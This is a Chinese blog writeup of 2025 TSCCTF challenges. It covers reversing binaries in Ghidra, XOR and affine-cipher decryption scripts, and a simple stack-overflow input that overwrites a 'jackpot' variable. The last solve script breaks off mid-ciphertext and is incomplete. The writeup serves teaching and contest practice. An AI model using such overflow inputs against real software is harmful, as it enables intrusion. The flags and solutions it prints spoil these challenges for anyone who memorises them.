---
title: "2025 TSCCTF writeup"
published: 2025-01-16T00:00:00.000Z
description: ""
tags: [Writeups, CTF]
category: CTF
draft: false
---
# 2025 TSCCTF owl_d writeup

## Welcome

### Give you a free flag

![image](https://hackmd.io/_uploads/HyswtsHwJe.png)
反白就可以找到flag

### Please join our discord

![image](https://hackmd.io/_uploads/SJgaKoHP1l.png)
在announcement這裡
（我找了一天 哭）

<!--more-->

### Feedback Form

填問卷

## Reverse

### What_Happened

丟到Ghidra去分析
先看一下Defined Strings有沒有特別的
![image](https://hackmd.io/_uploads/SynloiHv1l.png)
發現右下角有一段跟flag相關
點兩下go to發現main function
![image](https://hackmd.io/_uploads/SkzvisrDkl.png)
在他附近也可以馬上看到Decrypted Flag的相關函數
![image](https://hackmd.io/_uploads/r1Er3sHw1l.png)
所以可以看出是用XOR解密，接下來把encrypted flag找出來就好

![image](https://hackmd.io/_uploads/B1BKnirPyg.png)
找到之後全部對0xAA做XOR，最後就可以得到

```
TSC{I_Think_you_Fix_2ome_3rror}
```

### Chill Checker

丟到Ghidra做分析
一樣先看Defined Strings有沒有重要的東西
![image](https://hackmd.io/_uploads/r1ZTpiHDJl.png)
有跟flag相關的當然就直接go to過去了
在那附近會先看到generate_flag()

```
void generate_flag(char *param_1)

{
  byte local_a8 [64];
  byte local_68 [64];
  undefined8 local_28;
  undefined8 local_20;
  undefined local_18;
  int local_10;
  int local_c;
  
  local_28 = 0x64237d2d32191407;
  local_20 = 0x2e6c286a162e760c;
  local_18 = 0x2e;
  local_10 = 0x11;
  snprintf((char *)local_68,0x32,"%s%s%c",param_1,param_1,(ulong)(uint)(int)*param_1);
  for (local_c = 0; local_c < local_10; local_c = local_c + 1) {
    local_a8[local_c] = local_68[local_c] ^ *(byte *)((long)&local_28 + (long)local_c);
  }
  local_a8[local_10] = 0;
  printf("Your flag is: %s\n",local_a8);
  return;
}

```

接著回去看一下symbol tree
![image](https://hackmd.io/_uploads/S1WiCsSDke.png)
打開main會看到

```

undefined8 main(void)

{
  char cVar1;
  int iVar2;
  undefined8 local_48 [4];
  char local_28 [20];
  undefined4 local_14;
  int local_10;
  int local_c;
  
  local_14 = 0xdeadbeef;
  for (local_c = 0; local_c < 0x14; local_c = local_c + 1) {
    *(undefined *)((long)local_48 + (long)local_c) = 0;
  }
  local_48[0] = 0x57484959495a4753;
  printf("Whisper your code: ");
  __isoc99_scanf(&DAT_001020e4,local_28);
  for (local_10 = 0; local_10 < 8; local_10 = local_10 + 1) {
    cVar1 = complex_function((int)local_28[local_10],local_10 + 8);
    local_28[local_10] = cVar1;
  }
  iVar2 = strcmp(local_28,(char *)local_48);
  if (iVar2 == 0) {
    puts("Man, you\'re really on fire!");
    generate_flag(local_28);
  }
  else {
    random_failure_message();
  }
  return 0;
}


```

發現裡面有跟一個complex_function相關
也去把它打開看

```

int complex_function(int param_1,int param_2)

{
  if ((0x40 < param_1) && (param_1 < 0x5b)) {
    return (param_1 + -0x41 + param_2 * 0x1f) % 0x1a + 0x41;
  }
  puts("Go to reverse, please.");
                    /* WARNING: Subroutine does not return */
  exit(1);
}


```

所以，把目前有的資訊整理一下

```
ci=((cp[i]−0x41−k)%26+26)%26+0x41
where k=(i+8)×31.
```

Original Input:
![image](https://hackmd.io/_uploads/BkHYynBPyg.png)

Generated Flag:
![image](https://hackmd.io/_uploads/rkiakhSvyg.png)

組合起來：

```
TSC{t4k3_1t_3a$y}
```

### Gateway to the Reverse

首先，先載下來丟進Ghidra
然後觀察一下Symbol Tree
![image](https://hackmd.io/_uploads/Hy2tpYHDyl.png)
把每一個function都點開來稍微看一下
會發現FUN_00101090, FUN_001013d0是比較有內容的
![image](https://hackmd.io/_uploads/HybJAYSD1x.png)

```
undefined8 FUN_00101090(void)

{
  int iVar1;
  undefined4 local_118;
  undefined4 uStack_114;
  undefined4 uStack_110;
  undefined4 uStack_10c;
  undefined3 uStack_108;
  undefined4 uStack_105;
  undefined4 uStack_101;
  undefined4 uStack_fd;
  char local_f8 [112];
  char local_88 [120];
  
  local_118 = 0x723d4c4e;
  uStack_114 = 0x662b656a;
  uStack_110 = 0x56652653;
  uStack_10c = 0x64522150;
  uStack_108 = 0x3d7f4b;
  uStack_105 = 0x797b3b65;
  uStack_101 = 0x34474336;
  uStack_fd = 0x666941;
  puts("=============================================");
  puts("You stand before the Gate of the Reverse World.");
  puts("A voice echoes from the darkness:\n");
  puts("  \"Beyond this gate lies the Reverse World, a realm");
  puts("   of infinite knowledge and untold secrets.");
  puts("   But only those who can decipher the key may enter.\"\n");
  puts("The gatekeeper continues:");
  puts("  \"Reveal today\'s lucky number, and the gate shall open.\"");
  puts("=============================================");
  printf("\nEnter the access key: ");
  __isoc99_scanf(&DAT_0010237c,local_f8);
  FUN_001013d0(&local_118,local_88);
  iVar1 = strcmp(local_f8,local_88);
  if (iVar1 == 0) {
    puts("  +===========================+");
    puts("  ||                         ||");
    puts("  ||       [  OPENED ]       ||");
    puts("  ||                         ||");
    puts("  ||   The gate creaks open, ||");
    puts("  ||   revealing a passage   ||");
    puts("  ||     to the unknown.     ||");
    puts("  +===========================+");
    puts("       || /         \\\\   ||");
    puts("       ||/           \\\\  ||");
    puts("       |/             \\\\ ||");
    puts("       /               \\\\||");
    puts("      /                 \\\\");
    puts("     /                   \\");
    puts("The gatekeeper smiles faintly: \"You are worthy. Step forward.\"");
  }
  else {
    puts("  +===========================+");
    puts("  ||                         ||");
    puts("  ||      [  LOCKED  ]       ||");
    puts("  ||                         ||");
    puts("  ||   The gate remains      ||");
    puts("  ||       firmly shut.      ||");
    puts("  ||                         ||");
    puts("  +===========================+");
    puts("       ||             ||");
    puts("       ||             ||");
    puts("       ||             ||");
    puts("       ||             ||");
    puts("       ||             ||");
    puts("       ||             ||");
    puts("The gatekeeper\'s voice booms:");
    puts("  \"Your answer is incorrect. The gate shall remain closed.\"");
    puts("  \"Return when you have deciphered the true key.\"");
  }
  return 0;
}

```

```
void FUN_001013d0(char *param_1,long param_2)

{
  int iVar1;
  size_t sVar2;
  long lVar3;
  
  sVar2 = strlen(param_1);
  iVar1 = (int)sVar2;
  if (0 < iVar1) {
    lVar3 = 1;
    do {
      *(byte *)(param_2 + -1 + lVar3) = (param_1[lVar3 + -1] ^ (byte)lVar3) + 5;
      lVar3 = lVar3 + 1;
    } while ((ulong)(iVar1 - 1) + 2 != lVar3);
  }
  *(undefined *)(param_2 + iVar1) = 0;
  return;
}

```

這邊稍微對照一下兩邊的參數

```
NL=rje+fS&eVP!RdK\x7F=e;{y6CG4Aif
```

把它拿去轉換一下

```
processed_char = (original_char XOR (position + 1)) + 5
```

就可以得到

```
TSC{th1s_1s_b4by_r3v3rs3_b4by}
```

## Pwn

### gamble_bad_bad

> buffer 為 20 字節，jackpot_value 緊接在後麵，佔用 4 字節。
> 如果輸入超過 20 字節，超出的部分將會覆寫 jackpot_value 的內容
> 主要目標：將 jackpot_value 覆寫為 "777"

輸入格式：
`20 字節的任意內容來填滿 buffer，再加上 "777" ，總共 23 字節`

舉例：
`"AAAAAAAAAAAAAAAAAAAA777"（20 個 A，3 個 7）`

![image](https://hackmd.io/_uploads/H1QXzhSwye.png)

```
TSC{Gamb1e_Very_bad_bad_but_}
```

## Crypto

### Very Simple Login

> 題目的程式碼中有這段

```
if username == 'Admin':
                print(f'FLAG : {FLAG}', end='\n\n')
                sys.exit()
```

所以只要有Admin身份即可
![image](https://hackmd.io/_uploads/S179E2SDkl.png)

```
TSC{Wr0nG_HM4C_7O_L3A_!!!}
```

### Classic

密文

```
o`15~UN;;U~;F~U0OkW;FNW;F]WNlUGV"
```

目前知道的原文

```
TSC{..........}
```

從題目的程式碼中可以看出加密關係是 `f(x)=(Ax+B)mod94`
所以是二元一次方程式->只要兩組x, y就可以解
![image](https://hackmd.io/_uploads/H13jPnrvye.png)

代入可得

```
A = 29 mod 94
B = 27 mod 94
```

所以回推反元素

```
A^-1 = 13 mod 94
```

有這三個就可以開始寫腳本解密了

```
import string

# 定義 charset
charset = string.digits + string.ascii_letters + string.punctuation  # 長度 94

# 解密參數
A_inv = 13
B = 27

# 密文
ciphertext = r'o`15~UN;;U~;F~U0OkW;FNW;F]WNlUGV"'

# 解密過程
plaintext = []

for ch in ciphertext:
    y = charset.index(ch)         # 找到密文字元的索引
    y_ = (y - B) % 94             # 計算 y' = (y - B) mod 94
    x = (A_inv * y_) % 94         # 計算 x = A_inv * y' mod 94
    plaintext.append(charset[x])  # 將 x 對應回明文字元

# 輸出解密後的旗標
decrypted_flag = "".join(plaintext)
print(decrypted_flag)

```

最後得到flag

```
TSC{c14551c5_c1ph3r5_4r5_fr4g17e}
```

### Random Strange Algorithm

先解梅森指數pair

```
import math

# 判斷 p+q 與 ciphertext 位數大致相符
def bit_length_of_cipher(ct_hex_str):
    return len(bin(int(ct_hex_str, 16))) - 2

cipher_hex = "0x27225c567dfd854ba84614f9e8266db9f326af279aa18afbdb1f601a097ddbf5a203c836d4d0430c59f6d6be6ccfe7f4deca9a4011bc514d92e1aaa1c792cd24127a24b205a2c0a28af24edee1692d04a23aa8653581fe8e3c922878aaeb1c1f495cf08c129bae8ec039d1dc8c39564bdfdcefee42c42f5843c63aeff373613cc133076356241a9b06e45c367b84083e0edf21608f08f5d50563502438746355c1fe7c2f5a470b6857aabc04cc1f6b136e1f79bc2c41419b13ff845d485d380e2b110c2bd2e873e2c07d75d3e9cf1cd6b5634c67e98f11fe7a269e10af713dbb4f587443a630fe1dea2f406793213ce117828b0572dc4d3f06dcce3722bef0d0e8c2aced34d353e9ffe3d0f75a3e0ac195e73888d601c4dde936a573c28aaf6750ea0ad53fdc715c4df547279fdaeb68251ba4bb68f4aa7c0b49241e3e6fc58daae1c4dceb7ba0ef06d3fdec2bfa432ea1a5299d3dd104dd05b10be33303a5fea87cb6fc5d2f0e7daafe1b8f5c50066da68318b510bfd93e2abbadfc86b258bd82f2f53396abfc92a2f71dfd88bfd23b31013844d744d9788bbeb3cb425acfad0f6e868ed84a3152f82cbfc2f8386f059091cab29b9e64cbcc7d9ae672d1801b2dd4521253cffc4a21d476d00c8ac08495118df4ebff044f99e0ee8a56bcb43b3975d7794ff022850031fc0ab7a0b7cc1fe9894a739a7928eb7736910c748548ded36772dc2c6e81fd863af09473ec9e74b12bdddc9141bf46d226c67ce8efc9b02bc7ca3f067336032a7fafe93430fc2006cef8745864868430bcedee25244ba05621e7c2a72cdf524455f650766bc42d15662948ea9d5176c0796a0651a8faeff0ff276c7f65fc1784adeffc03899469192b691db929666509541cc770c487eef20195e704ff63bf1a6c18f20a0a19599cc54113223de37860c2cffbdfb7357da87b28f7bf8b416071196c354331138eb47aa11910c9756c5affa80b97111dddb6d147fe0c30bbfa2ee86cbb36129eef5e543f150023070cf650151e38bbee3a05963ff1cf26a2d42731b6c4487bad5e67eda74b3e9110f4e7df74e5e2819ef80b7f70b33ac3060ca18176e9f48e95d333c4fe5c2ae355a9661de75494fda5ef2d93d4404cf906969fe3ba7f589b263e61cc538986206cdd4177b7898ff5a016c2baccb5d00d78fdc462beaf989bfedbbc70ccaf85489cd1352ff32d0e213bb9cb23e7840eccd020e34ba441a40df86ea128e9f0215b32ab90dd9756afe87f40758676fff71c517895cd3b0f6f35a6f675634dfb1994945105b0276e9b0bbaf15d49824ad20c9865a4608ab0ea3093a32b7e40131010e25f9a939620a6ea43000fb2cd0a75eefd1e01da402f11bde242cb794c135a94db04123b2f874b9eda525f9c1932250084b4b4f096595d4f829691df2908ec625a16695e111083dd4d13665bc8baedaf159100b5c3bb6b9d2450471f5006a99165745c825c4a44b1c1de75a7fa23fca0183d59c3150c8aa6bd787aafcb40d17b053ef8ff7dd9fd1c03e9a60e2d0418bec88773fdd9ff3917f584496cebedaca5ab6c674c7a294bebba764b681c333559acf97bef89290a66cf7249cac824cc43558cf777fe1283d134159747e174a2c6c65a8f4c1ec6ae656465ee52ddab9d56e0b30bf29157ef86b72c3fb836a10df8f0c98fb2cbd7debecb98172eab7475491b7b6aa8fcf1d89f1275bbe5226897d42ea5913d8634ac1a2a5a8211ae3a0627ff53f423dc789e2323a2ef0f9b90f47370a8ef86664dfdb08ae01e3a2c3ea68a5b12cc197207b5c6df451d6e109ac00082b4be5295819b3341429b32653b2cd2d5547dfcb4970c3caa687a1ec2bf50d4db5b2cc2967fb7b3fb47eaa84094b6a73b29162baddd07f045de495006f714b9538bfafab29ba9705b8d5ccb3458ebaaf87078e8b16bb2390b0cedc3a65a08122d6834758d8053e519b479a4b4818fd3d6f9dd52e9e7f1ece3237f58d07399d44692c08e2c50c8632a40592a148492a0c475cb33579b48b6fbe5441fde23ed89b0686f69cced80bed326cda230de3a1c8777422038662cd052bf7f8bd021b8e4f885941957bcfc32d3c9da028068c30c5b19c3cffa9a1a044cd23d01cab79c149e3ac0d77ce6694a41cd0b404be056ad35cc31cf4051d6d855e73ddc4c0aeef5c6075af182e3f05503f73ea25874f430d3a13ee2b291be56a510aa8a6505868c7467f1a43a0b84817c841f1ff7a8af8872cc977f55f7add6d8411fa35f93edd13a9eabb688762e74be5a98e02806248f8be03c72ff4d1074f06ef2e77b9159b6db5db8158212d614c8a024ff51871fd152f53b1998dddd07f65eaeea5f3ab6bbc33dce92179a4e140d7ebf0b06c412ee8b2636d90dd003721bd54c0d20bc5b071cce0a970625a28b0bf4aaf09c57fdb40bdeae24e3e20c5d0bfa0ab64fc627c6c633f93252460b8d8edcbfd6fd43a45dd1e3adc11733232686358dca0db03b23df9bde2d359695ab3e6af5ebe881c25ae5bc2be2a392551bc0f9a9c50e4b9306631f668c95479a11d267984e3cd407701d4d9b7c077804663b6b68e10030915023da5414df1905ce1e4b0ba7c4f677bcbdc89e778e7927ff4aa2a7699cc7447f433e4ba4072627f5e955735e6650cade1676410b2001cccd2d4146e0ee0671dbee364d34c4224d886e8704062c96e56f6e1e463f2f60a6267ee7e45d387b705beb765ee62898a52e6d9190f9079a2cc2c823c6a97a38750337fcb9c3b682ea60e0250c8f733ae1cd11de95a219cabe9db8e27db6ffc1af616ed7b8f27e8e748c5620291a9a850f24057fc1e0dbe6b6db49257c1c57cebed13ace5196af892ccc2b09b76f54048390bd5d06387ebddaefb2dca8b94c9d663cf2a6f4480c14f932c08667be1b7210181c4c8df0f1cea710cdb567fb2b1e126141bd1616436044f8722f81f7fe45ac67386ed806c471b782b6c288334b896803779e4b50a7280fec70e84c39303764b30f8d98d178968eae949192e1cdbbd378b186211cfd15d6e68cf9a85ea3873451d3f26ffce9d2f76e23cfca012687e17c78e214f22163f2a0b94ac7b3067b232ee7d6ab57e6991b668ad84d6602b5838a15566b5a407eea66ebd106a2fb67a367753e0bab7ffdc234a00c8ab0540f38379daa09f47c22cd3c96f2d3a13d17ddf2970aaec4f65029896fa549ba832f8bebebd2c00d895a568be4b8d093089fb0f5e9f9a4d37a7ed5ace03268b236d33ae36b8168633de6178de56a1053df6a9b1d902df020ecaed6612aba8dd03dee1ea0a00467f9dcb98cfbc742e352d6315dc479216f08765b7341a085ac313c2b8856d22cd822ba6fd1a62519ae1cfec489e678e0440a1aeacbcb917aed893c0255618569ba9c03e627d0ce7ecd33ce64e26b9ff4ed9fc3f6f87dc105f4962373d86f155b64273b4a14cad88bc07265b78ba3b8e87b7b5dde2d39349658a295295c253495004a9a6c7d8ec46414f6c74bff4179784ad19dac1f5897bb56c1716f7cc238024d1243399329843cc8cbc1ec15dc69f089c43f3c6545cd35d1d176c3bbc5c6ea5475fcc9b7411d96febbb4fef67124897a4ab311ec2f32ae590065f3e4f76b716479d9506e6a03a151ba6258e31eda4feee96d3e255c74c874e197de71156ad5b1df35ce20a60033714689bd409b1b35aafa3b3cda73d7524321c7562f7dad33e22cc9ea6cea4d3933a9ef1924ff0add9a441647bbeaa8a13e680281956abba2231ad39778c3bb92cea57b93ec063b676fc8d0ce898a1856449c1b1b16d7973ba40c5aa52edb1dc7e2332fcf61217cd02e31b0c5c787089771acb3e8c2b7715911e09cd9183e803d80c9873074026c3e4ecfe11600b2e507e159a56e0394f1b42618aaf7363523a4c8b53c497fecdc65d167bdb2c4f79ee393387e364954debe37f1a933b964af9ac3e3227a77a167f3491e61eb43a67bb7a13c6b113ebeb0784dd5e70422ca27eebc2e703fc2c7996375c9b4d4f3aa44b6ab4f8e08f6cc8263e0229a12582f2c2301d1650d2a2f1146f87a59a34178b54a58fd46ca725267bb2f4a19fbac7b53b6f6aa1d70bb46674b5879d6ed81f40f01c62634d1ba6dee627d75e4f1333e2805e00f142860193e278ec1d676cc25c3ae91237ab9209b26a304b2e65b7bb6a68fbc300d8114f14adafe8cff69d554de4d8ba4e321f94b3d90bf9feeeeadd1bbdffde39c7036c70ffc340b0f9f8d819e925ecac8feca4a6c4aa9918477e742a0d104c0972ef02082fa9365d49654b29306c131d36eccb0e393f186553e08217f69a6191b1d4017ab431e45cbb8a4511e4cd6fa183c6f7e5612bfe8c3ae2b10e97c530ae172ebcb201585b05c1aedbed2daea99026596486063b620db4a75a72ece20683abb3e53d2a067785e8fa396d0f02233bd8221d1e7620af36a5e9c98d4e3f4eaef09794dde1ecea87dd531f276da98a3112665ced8610937f1b8d6cf0dde32de980fe1ee43bf856f3fc8b34035f5345d80b2c123a4ea7b24da20a065a08e9be1b5808b18727b689cd376d620d28566e9d7f7507e1b7705bd0fccd631891f297ff44990c2b1c697e9582531025e7556824e89db58672e0bf91fe7aad4e5d6d733cace0d92a5089fff9c6e7a4a56c857934143e6296950a0dc3e3a4cfcb479c4c2f18d52d1a67aa260f421a5f657b371faffada38099edbf07b7799e2424ae24a9ad2b76bb5e75453b5b3c4270f0be1448d3fda6660d77ec8e569d6c21f532d8871b9e5d60ac6a1b80b688c6efe12678e8cedd7b3ef19658ccf13f554c92fbd37d3773e57d8fd79c9f21783495a9d534efdd8f99a6d27ea40d76d032bc8f999ece9a55f292fb80111d526d1a0a8b33f4e35ea820cd4dfc8a526ead8baad66f5b2d86404de48d97a8a4d6b7f50eccc1350a60a23a4f3d479473ed1825f373b78003080af07f99ac6ead34124a5d43cef23c2e548779993c73c7cd5e89624dfa3952251b8e86eb9d4bce88244c60b0b0765379054f532fddff5e6a4da75d38ab7f67f8bede89c812259f948e4371d82e2b838e62250475e7986e97ad9706d84a57560934d9cd566cc5fba0f4f7037554ad926e68f178323881f33aba7a6811a03f3f507b6494428f3428927bd120b73298b2f5cad421985b0af070b9fae7037ea3cef1885d3846ba8cd09cd9f43070096a249796bcdd21ca55c76816ead0692e0587d96f831f343dde19117083509e0d4f5b296674dcc0e17b669f7c2ab4b0a609d6cbed8073d1aec3ef2cee0aad9c055d54ac11d58c01ab27956b3bbd667f5bb52dc96b647fc9ee2dc47ae8e5bab66d1bbf66d21926e063a90d7438e501113e78e9506c20c0dcc517189d5f54a6b4d53bff8173adbb3c2c4017e440f05517fa56c424d03b2e8dd81537a714cb53c3ec1c8237344d3ce8a0e8f81cb5693908f0cf63001cb0f2218a53b9be92f4c1aed51ba9a224523ae765a71ad3ba687594496ec72887a8f3a6f6338fab6c14ed6c139d687f5de68f99a2b4b425774abe7ad24995d775b8ac11efbc6ef0b38f6377c969ed6e63919f510c5444347155903c72be2f82de608b3abaec12a084c7a3cf06b6be7bef4478c723b90c5b652b1a87b206a2f1405a89471a4b9a073f3204a158e20a5e3dc6c4f433360927dce3b58ca65b3c42d18bf860a977ffc469cca122c8dfd338cdaffa4d796e4ee0314f581b0683763d6b9c0cf6498fad28fd4506258023553ef4d66f7e389014ca9a0e38627910a816cd51c95ff5a269080cc08ff96fd035efd2a0c192d58e09bc3d864c165c90da82bd2e61617132b9f62861c176d11a56d335589c534cdfc7312de0da2b845a863e35293eb60341328df60fcb9927115e7f24e6fe0a2bef5bbbaf560b13d58c93a3878bc99d44b5e748692b231ad3c84187776e29905979a7470424b1df92ea82374efad63da2a1c41aaf4c1e446416eaac450f659ce12012d7a22f3c8d97848356ded7504b448a9595683f2be12fd23c4fbdaaded9a3207031077272f64428e9e202d03a2083c7e68807ac9eda25130deb4347a8c2ae36a211a8324218da4276c1b5566b0bb7bd70ccfb580bce3ee108915bc1b21ad49de03875bd0346752e8a1c6788fd829a74abf7b01a3329f9bd7a2535c312f5a48b20623646e1078b6d4f5df9c0cc0bc06d41deb208b31cbe4b49e8dcf697bc7439d00a0c87bb64be44115b440d6b0fcf38e024bc332290b4ca33d1fa097799cae6cbf297b68a87ff8ba687ef4a5dbb25e02e7f95ea2bfb34db25ccb38df96f1bb32372ff00e5f3d78c0ce5a1bde27d2af89bb11efdf4b1b11feaf8c36b3373c0867b3fecbe58150a88758873ae4ecd3df4da6549732245da3cebd152a3dbef070aacd7f0c760fc797c253f9375edee15ec7f783059818df5ec0632c10e50f8dce4fbd4ddcff61c9601a88925db83dfe1b6a4bbdf76506828a1ece4ee99c1e356b686b880aaaf1f789d0b8e1a5ef69b7c12d57161bbab80219d270ab65ce6b1d29bcc24a6bedc18ac73783a2271560ec5193b20979c2168a0da1da6a30d9f7190973ac11906de52f80db4d40b5a86c1084ad17115718b7c9327dcd1aaf266df16f0f232ed926b2d7f139c37ad527a01ef38bcb3dfae204ebafda14ecac741ef1769c2f02189c2c474cb3b9f79884a767baad126a5a14c99e2fc6a1f1c0d3c1598f5670ce19aa0d01c6a7302d4e66d28315139f9b20f474ae1a39b93bb18a479733db8bf9dd737f8a09d4146ad89850342445eee2ca3141a672047814e42b7b9bd7798d6d8d82adba9d696dce955e61815520618a1ec70a9264acd244a5d8f5170f3a0ece58351737c31a617d3e646916e503cd7b20c6decafe3a8532f6bde5e89b7b8314a73dcf9c75090331d7f56820637c2d9ace9a75d8cef4a5f45049a8d17ecddd1c1e7f2683588cf834e82044e38e571ef786c9b1ff1ab9dd40644784f2820a42a9c1ecbe155d54557bd34c2c8245fe9f6187fa97c46929dffcf2b0d49679a51a2cd069879174b7d1556c83e2aaecf0e9a7fa52af3b3f0d6dbe95474da464c065db054521f17e0cf676060acb4c64fb7f9d42ad518a27ebcbdeb9e1183ac02c182e19fe98948be6ca6b44b8936294234c0c795bebf6726bb9f6d71029b7226a7f2d920d7c6d5bad845dbd7126be045ff9f2553f617591e0aad0979e2194b4ca5d0624cbe141c4a3e36d218f58ad3675412d29917ea1e91ee05b7a52267534b2386ecfa2f9634214ae42511dadd68f75422fd87d99309f38ecb97ece0ea084d5f11c15b6059a5c161881bf421a143a8e400bb41b9c42af3943cc3308523717d2684e605c19f4f61b02b1d437f8ea2ff31c478b820c503a847c07ec5a11f84ebddb13976db04fef81ad11c1917ac48ba5dfec46f7e5ccd1743b56d837acbe81dd60fdd8e65e6d7bffa03aeb6b4c5af715dcbe48dfa54f5802627f05736521096b6755103aac95d1dbe803eb15e200180e557d5238e9a5d06a2f9d1573bc4d302739050c2da989309fa060bf31f233d118fe4673491af97c6504774db6b08d5772f718460f99b2b2fcd0b455ca4d119a42a982d22e1d0931736d26740b8bd0930d0b673300b8d602fa230ebbb56a599aaf341382072d843fb8850ba41b18ce628687388f32e896fbb01387ded3099aa1f567093f69dcd08d5822ed345453efab20c3a5ba059c19fd3c8c660776ca1ab858433e83ddd6fccca3df9ee20d1634b60a284f7497bd40f58eb2f58ffb4530cc3ad9024132ca7f45f69426f1e1cba8b8a811cf8971c94352ee445d1e37e4157b406864de23e44c2698e6be5737bc4e8dafa303e8c4b6b800fbed343b9a8867633040c0ab8c80e5ab12e22966e4125e760dfcd34d217a4703d6743d24ce97469b120d57cb3e9b19100f90dd794ccb9ee86feec5a48b08de98799d99f9e"  # 題目給的那串
cipher_int = int(cipher_hex, 16)
ct_bitlen = bit_length_of_cipher(cipher_hex)

# "已知" 的梅森指數列表
mersenne_exps = [
    2, 3, 5, 7, 13, 17, 19, 31, 61, 89, 107, 127,
    521, 607, 1279, 2203, 2281, 3217, 4253, 4423,
    9689, 9941, 11213, 19937, 21701, 23209, 44497,
    86243, 110503, 132049, 216091, 756839
]

candidate_pairs = []
for p_guess in mersenne_exps:
    for q_guess in mersenne_exps:
        # 先簡單判斷 bit 長
        if p_guess + q_guess == ct_bitlen:
            # 進一步檢查
            candidate_pairs.append((p_guess, q_guess))

print("Possible pairs that match bit length:", candidate_pairs)

```

得到兩個pair

```
(21701, 23209), (23209, 21701)
```

再寫一個腳本計算

```
def strange(x, y, p, q):
    return x + (y << p) + (y << q) - y

def weird(x, e, p, q, M):
    res = 1
    bin_e = bin(e)[2:][::-1]  # 將 e 的 bits 反轉, 方便做 square-and-multiply
    for bit in bin_e:
        if bit == '1':
            # multiply
            res = res * x
            for _ in range(3):
                low = res & M
                high = res >> (p + q)
                res = strange(low, high, p, q)
        # square
        x = x * x
        for _ in range(3):
            low = x & M
            high = x >> (p + q)
            x = strange(low, high, p, q)
    return res

def decrypt_cipher(ct_int, p, q):
    """ 傳回解密後的 bytes """
    # 1) 計算 M
    M = (1 << (p+q)) - 1
  
    # 2) 計算群的 order
    #    若 2^p - 1 與 2^q - 1 都是 prime, 則 phi(2^p - 1) = 2^p - 2, etc.
    from math import gcd
    def lcm(a, b):
        return a*b // gcd(a, b)
  
    order_p = (1 << p) - 2   # 2^p - 2
    order_q = (1 << q) - 2   # 2^q - 2
    order   = lcm(order_p, order_q)

    # 3) 求 d
    e = 65537
    d = pow(e, -1, order) 

    # 4) 做 weird(ct, d, p, q, M)
    pt_int = weird(ct_int, d, p, q, M)

    # 5) 將結果轉成 bytes
    pt_bytes = pt_int.to_bytes((pt_int.bit_length() + 7) // 8, 'big')
    return pt_bytes

cipher_hex = "0x27225c567dfd854ba84614f9e8266db9f326af279aa18afbdb1f601a097ddbf5a203c836d4d0430c59f6d6be6ccfe7f4deca9a4011bc514d92e1aaa1c792cd24127a24b205a2c0a28af24edee1692d04a23aa8653581fe8e3c922878aaeb1c1f495cf08c129bae8ec039d1dc8c39564bdfdcefee42c42f5843c63aeff373613cc133076356241a9b06e45c367b84083e0edf21608f08f5d50563502438746355c1fe7c2f5a470b6857aabc04cc1f6b136e1f79bc2c41419b13ff845d485d380e2b110c2bd2e873e2c07d75d3e9cf1cd6b5634c67e98f11fe7a269e10af713dbb4f587443a630fe1dea2f406793213ce117828b0572dc4d3f06dcce3722bef0d0e8c2aced34d353e9ffe3d0f75a3e0ac195e73888d601c4dde936a573c28aaf6750ea0ad53fdc715c4df547279fdaeb68251ba4bb68f4aa7c0b49241e3e6fc58daae1c4dceb7ba0ef06d3fdec2bfa432ea1a5299d3dd104dd05b10be33303a5fea87cb6fc5d2f0e7daafe1b8f5c50066da68318b510bfd93e2abbadfc86b258bd82f2f53396abfc92a2f71dfd88bfd23b31013844d744d9788bbeb3cb425acfad0f6e868ed84a3152f82cbfc2f8386f059091cab29b9e64cbcc7d9ae672d1801b2dd4521253cffc4a21d476d00c8ac08495118df4ebff044f99e0ee8a56bcb43b3975d7794ff022850031fc0ab7a0b7cc1fe9894a739a7928eb7736910c748548ded36772dc2c6e81fd863af09473ec9e74b12bdddc9141bf46d226c67ce8efc9b02bc7ca3f067336032a7fafe93430fc2006cef8745864868430bcedee25244ba05621e7c2a72cdf524455f650766bc42d15662948ea9d5176c0796a0651a8faeff0ff276c7f65fc1784adeffc03899469192b691db929666509541cc770c487eef20195e704ff63bf1a6c18f20a0a19599cc54113223de37860c2cffbdfb7357da87b28f7bf8b416071196c354331138eb47aa11910c9756c5affa80b97111dddb6d147fe0c30bbfa2ee86cbb36129eef5e543f150023070cf650151e38bbee3a05963ff1cf26a2d42731b6c4487bad5e67eda74b3e9110f4e7df74e5e2819ef80b7f70b33ac3060ca18176e9f48e95d333c4fe5c2ae355a9661de75494fda5ef2d93d4404cf906969fe3ba7f589b263e61cc538986206cdd4177b7898ff5a016c2baccb5d00d78fdc462beaf989bfedbbc70ccaf85489cd1352ff32d0e213bb9cb23e7840eccd020e34ba441a40df86ea128e9f0215b32ab90dd9756afe87f40758676fff71c517895cd3b0f6f35a6f675634dfb1994945105b0276e9b0bbaf15d49824ad20c9865a4608ab0ea3093a32b7e40131010e25f9a939620a6ea43000fb2cd0a75eefd1e01da402f11bde242cb794c135a94db04123b2f874b9eda525f9c1932250084b4b4f096595d4f829691df2908ec625a16695e111083dd4d13665bc8baedaf159100b5c3bb6b9d2450471f5006a99165745c825c4a44b1c1de75a7fa23fca0183d59c3150c8aa6bd787aafcb40d17b053ef8ff7dd9fd1c03e9a60e2d0418bec88773fdd9ff3917f584496cebedaca5ab6c674c7a294bebba764b681c333559acf97bef89290a66cf7249cac824cc43558cf777fe1283d134159747e174a2c6c65a8f4c1ec6ae656465ee52ddab9d56e0b30bf29157ef86b72c3fb836a10df8f0c98fb2cbd7debecb98172eab7475491b7b6aa8fcf1d89f1275bbe5226897d42ea5913d8634ac1a2a5a8211ae3a0627ff53f423dc789e2323a2ef0f9b90f47370a8ef86664dfdb08ae01e3a2c3ea68a5b12cc197207b5c6df451d6e109ac00082b4be5295819b3341429b32653b2cd2d5547dfcb4970c3caa687a1ec2bf50d4db5b2cc2967fb7b3fb47eaa84094b6a73b29162baddd07f045de495006f714b9538bfafab29ba9705b8d5ccb3458ebaaf87078e8b16bb2390b0cedc3a65a08122d6834758d8053e519b479a4b4818fd3d6f9dd52e9e7f1ece3237f58d07399d44692c08e2c50c8632a40592a148492a0c475cb33579b48b6fbe5441fde23ed89b0686f69cced80bed326cda230de3a1c8777422038662cd052bf7f8bd021b8e4f885941957bcfc32d3c9da028068c30c5b19c3cffa9a1a044cd23d01cab79c149e3ac0d77ce6694a41cd0b404be056ad35cc31cf4051d6d855e73ddc4c0aeef5c6075af182e3f05503f73ea25874f430d3a13ee2b291be56a510aa8a6505868c7467f1a43a0b84817c841f1ff7a8af8872cc977f55f7add6d8411fa35f93edd13a9eabb688762e74be5a98e02806248f8be03c72ff4d1074f06ef2e77b9159b6db5db8158212d614c8a024ff51871fd152f53b